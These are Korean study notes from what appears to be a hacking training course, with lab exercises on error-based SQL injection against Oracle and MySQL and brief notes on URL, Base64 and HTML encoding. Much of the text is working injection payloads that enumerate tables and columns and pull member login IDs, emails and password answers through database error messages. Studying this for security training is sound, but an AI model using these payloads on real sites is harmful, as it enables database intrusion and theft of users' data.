@@ -1,0 +1,279 @@
+* 2일차 메모 
+
+실무 안나옴
+
+Error-based SQL Injection
+-> 유니온X 
+   문법에러 -> 에러메시지 안에 내가 원하는 데이터를 노출
+
+ORA-00923: FROM 키워드가 필요한 위치에 없습니다.   
+
+* DB에 제공해주는 함수
+함수들 중에서 에러메시지 안에 데이터를 노출!시키는 함수 <-
+
+1. UTL_INADDR.GET_HOST_NAME(IP) -> ip의 호스트네임을 알아내는 함수
+2. UTL_INADDR.GET_HOST_ADDRESS('주소') -> ip를 알아내는 함수 invalid number
+3. ORDSYS.ORD_DICOM.GETMAPPINGXPATH((서브쿼리), user, user) xpath 
+4. CTXSYS.DRITHSX.SN(user, (키워드사전이름)) -> 키워드사전에서 검색해주는 
+
+-> nslookup 
+select utl_inaddr.get_host_address('seyong.kr') from dual;
+-> 129.154.194.46 
+ORA-24247: 네트워크 액세스가 ACL(액세스 제어 목록)에 의해 거부되었습니다.
+
+
+select CTXSYS.DRITHSX.SN(user,(select 'hacker' from dual)) from dual;
+
+
+select 컬럼들 from 게시판 where 제목 like '%hihi%' and CTXSYS.DRITHSX.SN(user,('hacker'))= 'p%' 
+
+select 컬럼들 from 게시판 where 제목 like '%hihi%' and 
+
+검색어: hihi%' and CTXSYS.DRITHSX.SN(user,(select * from user_tables))= 'p
+ 1개의 row만 
+
+ORA-00913: too many values
+ 1개의 column만 
+
+ORA-01427: single-row subquery returns more than one row 
+
+여러개의 row, 여러개의 column 
+결과적으로 1개의 row에 1개 column 즉 문자열 1개씩 
+
+* Sub-query 
+  select  *  from   (select * from friends) -> 하나의 테이블
+  결과내 재검색 
+
+ select name, age, addr from  (select name, age, addr from friends where name like '%멍멍%')
+ where addr = '서울';
+
+ select name, age, addr from friends where name like '%멍멍%' and addr='서울';
+
+ select name as nick, age as year ,addr as home from friends;
+ select * from friends;
+
+ select name a.b, age as c.d
+ 
+ select name,addr, rownum from friends where addr='서울';
+
+
+select  n  from   (select name n,rownum r from friends) where rownum =1
+
+select 컬럼명 from (select 컬럼, rownum as l) where l=1 ,23,4,567
+
+* 테이블명 한개씩 뽑기 
+ select table_name from user_tables 
+ select table_name as a, rownum as b from user_tables
+ (select table_name as a, rownum as b from user_tables)
+ select (select count(select * from (select a from (select table_name as a, rownum as b from user_tables) where b = 1~count개까지)) from dual) || '개입니다.' from dual;
+
+ORA-01722: 'a'을(를) 포함하는 문자열 값을 숫자로 변환할 수 없음: 
+ORA-03302: (ORA-01722 세부정보) 부적합한 문자열 값: a
++ - 
+concat 
+
+* 개수를 파악 
+count
+
+
+1. 쿼리문 유추 
+select 컬럼들 from 게시판 where 제목 like '%__검색어__%'
+2. 공격포인트 
+에러유발 -> 에러메시지가 화면/응답상에 나타나는데 
+Internal Server Error-> DB에러가 노출 
+select 컬럼들 from 게시판 where 제목 like '%hihi%'  and [공격쿼리] or 'p%'='p%'
+
+검색어 : hihi%' and CTXSYS.DRITHSX.SN(user,([공격쿼리])) = 5 and 'p%'='p
+
+->  다른함수('hacker') -> 오류메시지 hacker? 
+->  다른함수(select 'hacker' from dual) -> hacker?
+->  다른함수([공격쿼리]) 
+
+3. 테이블 명 
+ select table_name from user_tables 
+ 3-1. 개수: select count(table_name) from user_tables 
+  hihi%' and CTXSYS.DRITHSX.SN(user,([공격쿼리])) = 5 and 'p%'='p
+  hihi%' and CTXSYS.DRITHSX.SN(user,(select count(table_name) from user_tables)) = 5 and 'p%'='p
+ 3-2. 1row씩 
+   select t from (select table_name t,rownum as ln from user_tables) where ln = 1~6
+
+   hihi%' and CTXSYS.DRITHSX.SN(user,([공격쿼리])) = 5 and 'p%'='p
+   hihi%' and CTXSYS.DRITHSX.SN(user,(select t from (select table_name t,rownum as ln from user_tables) where ln = 1)) = 5 and 'p%'='p
+
+DRG-11701: thesaurus BOARD does not exist 
+DRG-11701: thesaurus 6 does not exist 
+
+4.컬럼명 
+  select column_name from user_tab_columns where table_name = 'MEMBER'
+  4-1. 개수 : 21개
+  select count(column_name) from user_tab_columns where table_name = 'MEMBER'
+hihi%' and CTXSYS.DRITHSX.SN(user,([공격쿼리])) = 5 and 'p%'='p
+hihi%' and CTXSYS.DRITHSX.SN(user,(select count(column_name) from user_tab_columns where table_name = 'MEMBER')) = 5 and 'p%'='p
+  4-2. 1row씩 
+
+  select column_name from user_tab_columns where table_name = 'MEMBER'
+  select column_name from (select column_name, rownum r from user_tab_columns where table_name = 'MEMBER') where r=1~21
+hihi%' and CTXSYS.DRITHSX.SN(user,([공격쿼리])) = 5 and 'p%'='p
+hihi%' and CTXSYS.DRITHSX.SN(user,(select column_name from (select column_name, rownum r from user_tab_columns where table_name = 'MEMBER') where r=1)) = 5 and 'p%'='p
+
+2: LOGIN_ID
+3: USER_NM 
+6: EMAIL 
+19: PWDANS 
+
+5. 데이터 탈취 
+   select login_id, user_nm, email, pwdans from member 
+   5-1. 개수 : 1개
+   select count(*) from member 
+hihi%' and CTXSYS.DRITHSX.SN(user,([공격쿼리])) = 5 and 'p%'='p
+hihi%' and CTXSYS.DRITHSX.SN(user,(select count(*) from member)) = 5 and 'p%'='p
+   5-2.1row X 어차피 한row나오니까 
+
+MySQL -> 연습 
+
+윈도우 proxy세팅 -> 127.0.0.1
+
+브라우저에 따라서 작동이 안하는 페이지 <-
+
+* 인코딩 뭘로 디코딩해야 원래께나오지?
+URL Encoding -> Decoding -> 원래의 글 주소창 -> 
+%00%00%00 <-  녕
+    안   %00%00%00
+
+    %EC%95%88 %EB%85%95 %3F
+
+    bluebell인코더
+
+Base64 Encoding -> 데이터-> 사진을 업로드 -> 사진 hex -> base64 encoding-> 보내 주고받고
+awelkfj/+lwekfj==
+
+HTML Encoding 
+
+&#00;&#00;
+
+nc www.naver.com/ HTTP/1.1 
+/search.naver?keyword=you 
+
+
+200 OK <-
+
+URL, 주소 -> https://www.seyong.kr/자료실/union.zip?keyword=
+                    서브    도메인   path   파일   
+https://search.naver.com/search.naver?query=you%00i <- encoding
+
+search.naver 
+-> 
+query -> you%00i-> you&i
+2. 한글 -> 제대로 전달을하려고 
+
+https://search.naver.com/search.naver?sm=tab_hty.top&where=nexearch&ssc=tab.nx.all&query=%EC%95%84%EC%9D%B4%EC%9C%A0&oquery=hacker&tqi=jL4bhlqVOswssviEN0lssssss1N-508553&ackey=7woa07n5
+%EC%95%84%EC%9D%B4%EC%9C%A0 -> elzheld->한글 깨지지않게
+  Payload, HTTP Request Body 
+
+
+한글 윈도우                             ->            일본 윈도우
+  안녕?   ->  %00%00%00%00%00%00            ->  %00%00%00%00%00%00 -> 디코딩      뤡뤡궭
+   뷁궬궵              <-                뤡뤡궭
+  안녕?                       <-  %00%00%00%00%00%00 
+
+================================
+* SQL Injection Oracle 문제 6번   -> 3시에 문제풀이 ~ DBMS_XDB_VERSION.MAKEVERSIONED() 
+================================
+1. 풀이 과정 
+  쿼리문 유추부터 순서대로 쿼리문 포함해서 쭉 정리해주세요.
+2. 정답
+
+- CTXSYS.DRITHSX.SN 이거 말고 다른걸로!
+ -> UTL_INADDR.GET_HOST_NAME(IP)
+================================
+
+1. 쿼리문 유추
+ select 컬럼들 from 게시판 where 제목 like '%hihi%' and UTL_INADDR.GET_HOST_NAME('hacker')=4 and 'j%'='j%'
+
+2. 공격 포인트 
+검색어 : hihi%' and UTL_INADDR.GET_HOST_NAME((select 'test' from dual))=4 and 'j%'='j  
+검색어 : hihi%' and UTL_INADDR.GET_HOST_NAME(([공격쿼리]))=4 and 'j%'='j  
+DBMS_XDB_VERSION.MAKEVERSIONED()
+
+검색어: hihi%' and DBMS_XDB_VERSION.MAKEVERSIONED('hacker')!=null and 'j%'='j
+검색어: hihi%' and DBMS_XDB_VERSION.MAKEVERSIONED([공격구문])!=null and 'j%'='j
+검색어: hihi%' and DBMS_XDB_VERSION.MAKEVERSIONED((select user from dual))!=null and 'j%'='j
+
+3. 테이블명 
+   select table_name from user_tables 
+   3-1. 개수: 6개
+    select count(table_name) from user_tables
+    검색어 : hihi%' and UTL_INADDR.GET_HOST_NAME(([공격쿼리]))=4 and 'j%'='j  
+    검색어 : hihi%' and UTL_INADDR.GET_HOST_NAME((select count(table_name) from user_tables))=4 and 'j%'='j  
+    ORA-29257: host 6 unknown 
+
+   3-2. 1row씩: 5번째 테이블 EQST_ANSWER 
+    select n from (select table_name n, rownum m from user_tables) where m = 1~6
+    검색어 : hihi%' and UTL_INADDR.GET_HOST_NAME(([공격쿼리]))=4 and 'j%'='j  
+    검색어 : hihi%' and UTL_INADDR.GET_HOST_NAME((select n from (select table_name n, rownum m from user_tables) where m = 1))=4 and 'j%'='j  
+1번:  ORA-29257: host BOARD unknown 
+
+
+4. EQST_ANSWER테이블의 컬럼:  ANSWER_COLUMN
+   select column_name from cols where table_name = 'EQST_ANSWER'
+   4-1. 컬럼 개수 : 5개 
+   select count(column_name) from cols where table_name = 'EQST_ANSWER'
+   4-2. 컬럼 1 row:
+   select c from (select column_name c, rownum u from cols where table_name = 'EQST_ANSWER') where u = 1~5
+
+검색어: hihi%' and DBMS_XDB_VERSION.MAKEVERSIONED((select count(column_name) from cols where table_name = 'EQST_ANSWER'))!=null and 'j%'='j
+검색어: hihi%' and DBMS_XDB_VERSION.MAKEVERSIONED(([공격구문]))!=null and 'j%'='j
+검색어: hihi%' and DBMS_XDB_VERSION.MAKEVERSIONED((select c from (select column_name c, rownum u from cols where table_name = 'EQST_ANSWER') where u = 1))!=null and 'j%'='j
+
+
+5. 데이터:  
+   select answer_column from eqst_answer 
+   5-1. 개수 : 
+   select count(answer_column) from eqst_answer 
+   5-2. 1 row씩 
+
+
+ORA-29257: host hacker unknown 
+ ORA-29257: host test unknown 
+
+================================
+* SQL Injection MySQL 문제 6번  -> 4시 45분에 풀이~
+================================
+1. 풀이 과정 
+  쿼리문 유추부터 순서대로 쿼리문 포함해서 쭉 정리해주세요.
+2. 정답
+================================
+- Oracle                   VS          MySQL 
+개수 count()                        count()
+한줄씩                            limit 0,1
+   rownum r ~ where r
+함수 -> 어떤 함수가 MySQL 에서 에러 유발 시 메시지에 내가 원하는 데이터가 나오는지
+
+* MySQL 
+1. 테이블명 
+   select table_name from information_schema.tables where table_schema = database()
+   1-1. 개수 : 
+   select count(table_name) from information_schema.tables where table_schema = database()
+   1-2. 한row씩 :
+    select table_name from information_schema.tables where table_schema = database() limit 0~(count-1),1
+
+2. 컬럼명 
+   select column_name from information_schema.columns where table_name = '정답'
+   2-1. 개수 : 
+    select count(column_name) from information_schema.columns where table_name = '정답'
+   2-2. 1 row씩: 
+    select column_name from information_schema.columns where table_name = '정답' limit 0~,1
+
+
+error code : [1064] You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to u%'se near ' OR A.CONTENT like '%'%' OR U.USER_NM like '%'%' ) AND DATE_FORMAT(A.REG_DT ,' at line 17
+
+1. 쿼리문 유추 
+select 컬럼들 from 공지사항 where 제목소문자로 바꾼게 like '%__검색어__%'
+
+2. 공격포인트 
+' -> 에러코드 1064 
+
+select 컬럼들 from 공지사항 where 제목소문자로 바꾼게 like '%cc%' and extractvalue('1',concat(0x1a,'hi'))=1 and 'o%'='o%'
+
+
+검색어: cc%' and extractvalue('1',concat(0x1a,'hi'))=1 and 'o%'='o
